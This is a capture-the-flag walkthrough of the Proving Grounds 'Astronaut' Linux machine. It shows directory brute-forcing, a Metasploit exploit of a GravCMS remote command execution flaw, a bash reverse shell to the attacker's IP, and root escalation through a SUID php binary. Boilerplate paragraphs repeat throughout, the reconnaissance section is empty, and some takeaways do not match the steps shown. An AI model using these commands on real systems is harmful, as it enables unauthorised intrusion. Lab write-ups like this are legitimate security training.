---
title: "Proving Grounds - Astronaut (Linux)"
date: 2026-02-25
description: "Proving Grounds Astronaut Linux walkthrough covering reconnaissance, initial access, and privilege escalation."
categories: [Proving Grounds, Linux]
tags: [rce, suid, php, privilege-escalation]
mermaid: true
content_lang: en
alt_ja: /posts/pg-astronaut-ja/
---

## Overview

| Field                     | Value |
|---------------------------|-------|
| OS                        | Linux |
| Difficulty                | Not specified |
| Attack Surface            | Web application and exposed network services |
| Primary Entry Vector      | Web RCE (CVE-2021-21425) |
| Privilege Escalation Path | Local enumeration -> misconfiguration abuse -> root |

## Credentials

No credentials obtained.

## Reconnaissance

---
💡 Why this works  
This stage maps the reachable attack surface and identifies where exploitation is most likely to succeed. Accurate service and content discovery reduces blind testing and drives targeted follow-up actions.

## Initial Foothold

---
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50 -r --timeout 3 --no-state -s 200,301 -e -E -u http://$ip
```

```bash
                                                                                                                                                                        
✅[2:37][CPU:2][MEM:71][TUN0:192.168.45.168][/home/n0z0/work/pg/Apex]
🐉 > feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50 -r --timeout 3 --no-state -s 200,301 -e -E -u http://$ip
                                                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.12.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.155.12
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 301]
 💥  Timeout (secs)        │ 3
 🦡  User-Agent            │ feroxbuster/2.12.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💰  Collect Extensions    │ true
 💸  Ignored Extensions    │ [Images, Movies, Audio, etc...]
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      159l     1203w    14014c http://192.168.155.12/grav-admin/
200      GET      138l      931w    15508c http://192.168.155.12/grav-admin/admin
200      GET      154l      915w    12383c http://192.168.155.12/grav-admin/forgot_password
200      GET      159l     1203w    14014c http://192.168.155.12/grav-admin/home
200      GET      189l      969w    13967c http://192.168.155.12/grav-admin/login
200      GET       16l       32w      274c http://192.168.155.12/grav-admin/robots.txt

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
Name                                          Disclosure Date  Rank       Check  Description
```

```bash
msf > search grav

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/gravcms_exec               2021-03-29       normal     Yes    GravCMS Remote Command Execution
   1  auxiliary/admin/http/pihole_domains_api_exec  2021-08-04       normal     Yes    Pi-Hole Top Domains API Authenticated Exec
   2  exploit/unix/http/pihole_blocklist_exec       2020-05-10       excellent  Yes    Pi-Hole heisenbergCompensator Blocklist OS Command Execution
   3  exploit/unix/webapp/wp_infusionsoft_upload    2014-09-25       excellent  Yes    Wordpress InfusionSoft Upload Vulnerability
```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
Interact with a module by name or index. For example info 3, use 3 or use exploit/unix/webapp/wp_infusionsoft_upload

msf > use 0
[*] Using configured payload php/meterpreter/reverse_tcp
msf exploit(linux/http/gravcms_exec) > sho options
[-] Unknown command: sho. Did you mean show? Run the help command for more details.
msf exploit(linux/http/gravcms_exec) > show options

Module options (exploit/linux/http/gravcms_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5h, sapni, http, socks4, socks5
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
msf exploit(linux/http/gravcms_exec) > set rhosts 192.168.155.12
rhosts => 192.168.155.12
msf exploit(linux/http/gravcms_exec) > /grav-admin
[-] Unknown command: /grav-admin. Run the help command for more details.
msf exploit(linux/http/gravcms_exec) > set TARGETURI /grav-admin
TARGETURI => /grav-admin
msf exploit(linux/http/gravcms_exec) > run
[-] Msf::OptionValidateError One or more options failed to validate: LHOST.
msf exploit(linux/http/gravcms_exec) > set LHOST 192.168.45.168
LHOST => 192.168.45.168
msf exploit(linux/http/gravcms_exec) > run
[*] Started reverse TCP handler on 192.168.45.168:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Sending request to the admin path to generate cookie and token
[+] Cookie and CSRF token successfully extracted !
[*] Implanting payload via scheduler feature
[+] Scheduler successfully created ! Wait up to 93 seconds
[*] Sending stage (40004 bytes) to 192.168.155.12
[*] Cleaning up the scheduler...
[+] The scheduler config successfully cleaned up!
[*] Meterpreter session 4 opened (192.168.45.168:4444 -> 192.168.155.12:40862) at 2025-12-10 21:27:03 +0900

meterpreter > execute -f /bin/bash -a "-c 'bash -i >& /dev/tcp/192.168.45.168/4443 0>&1'"
Process 159813 created.
meterpreter > 

```

💡 Why this works  
The initial access step chains discovered weaknesses into executable control over the target. Successful foothold techniques are validated by command execution or interactive shell callbacks.

## Privilege Escalation

---
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
rlwrap -cAri nc -lvnp 4443
```

```bash
❌[21:26][CPU:17][MEM:69][TUN0:192.168.45.168][...me/n0z0/work/pg/Astronaut]
🐉 > rlwrap -cAri nc -lvnp 4443
listening on [any] 4443 ...
connect to [192.168.45.168] from (UNKNOWN) [192.168.155.12] 54326
bash: cannot set terminal process group (159792): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gravity:~/html/grav-admin$
```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
find / -xdev -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```

```bash
www-data@gravity:/home$ find / -xdev -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
-rwsr-xr-- 1 root messagebus 51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwxr-sr-x 1 root utmp 14648 Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwsr-xr-x 1 root root 146888 Dec  1  2022 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 473576 Mar 30  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 53040 Nov 29  2022 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root root 67816 Feb  7  2022 /usr/bin/su
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 85064 Nov 29  2022 /usr/bin/chfn
-rwxr-sr-x 1 root tty 14488 Mar 30  2020 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 84512 Nov 29  2022 /usr/bin/chage
-rwsr-xr-x 1 root root 39144 Feb  7  2022 /usr/bin/umount
-rwsr-xr-x 1 root root 166056 Jan 16  2023 /usr/bin/sudo
-rwxr-sr-x 1 root tty 35048 Feb  7  2022 /usr/bin/wall
-rwxr-sr-x 1 root shadow 31312 Nov 29  2022 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 350504 Mar 30  2022 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 68208 Nov 29  2022 /usr/bin/passwd
-rwsr-xr-x 1 root root 44784 Nov 29  2022 /usr/bin/newgrp
-rwsr-xr-x 1 root root 55528 Feb  7  2022 /usr/bin/mount
-rwsr-xr-x 1 root root 4786104 Feb 23  2023 /usr/bin/php7.4 #このsuidを使う
-rwxr-sr-x 1 root crontab 43720 Feb 13  2020 /usr/bin/crontab
-rwsr-xr-x 1 root root 88464 Nov 29  2022 /usr/bin/gpasswd
-rwxr-sr-x 1 root shadow 43160 Feb  2  2023 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 43168 Feb  2  2023 /usr/sbin/pam_extrausers_chkpwd

```

https://gtfobins.github.io/gtfobins/php/#suid
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
CMD="/bin/sh"
www-data@gravity:/usr/bin$ ./php -r "pcntl_exec('/bin/sh', ['-p']);"
```

```bash
www-data@gravity:/usr/bin$ CMD="/bin/sh"
www-data@gravity:/usr/bin$ www-data@gravity:/usr/bin$ ./php -r "pcntl_exec('/bin/sh', ['-p']);"

```

💡 Why this works  
Privilege escalation relies on local misconfigurations, unsafe permissions, and trusted execution paths. Enumerating and abusing these trust boundaries is the fastest route to root-level access.

## Lessons Learned / Key Takeaways

- Validate framework debug mode and error exposure in production-like environments.
- Restrict file permissions on scripts and binaries executed by privileged users or schedulers.
- Harden sudo policies to avoid wildcard command expansion and scriptable privileged tools.
- Treat exposed credentials and environment files as critical secrets.

## References

- CVE-2021-21425: https://nvd.nist.gov/vuln/detail/CVE-2021-21425
- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- feroxbuster: https://github.com/epi052/feroxbuster
- Nuclei: https://github.com/projectdiscovery/nuclei
- GTFOBins: https://gtfobins.org/
- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
